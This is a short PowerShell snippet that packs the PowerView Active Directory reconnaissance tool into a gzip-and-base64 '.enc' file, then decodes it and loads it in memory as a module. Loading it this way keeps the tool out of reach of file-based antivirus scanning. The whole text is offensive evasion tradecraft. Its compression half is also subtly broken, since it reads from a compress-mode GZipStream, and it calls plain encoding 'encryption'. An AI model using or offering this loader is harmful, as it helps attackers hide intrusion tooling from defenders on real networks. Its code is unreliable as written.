$modulePath = "C:\Tools\PowerView.ps1"
$moduleContent = Get-Content $modulePath -Raw
$compressed = [System.IO.Compression.GZipStream]::new(
    [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($moduleContent)),
    [System.IO.Compression.CompressionMode]::Compress
)
$ms = New-Object System.IO.MemoryStream
$compressed.CopyTo($ms)
$compressed.Close()
$base64 = [Convert]::ToBase64String($ms.ToArray())
$base64 | Out-File "C:\Tools\PowerView.enc" -Encoding ASCII





$encrypted = Get-Content "C:\Tools\PowerView.enc"

$bytes = [Convert]::FromBase64String($encrypted)
$ms = New-Object System.IO.MemoryStream(,$bytes)
$gzip = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($gzip)
$decrypted = $sr.ReadToEnd()
$sr.Close()

New-Module -ScriptBlock ([ScriptBlock]::Create($decrypted)) -Name PowerView

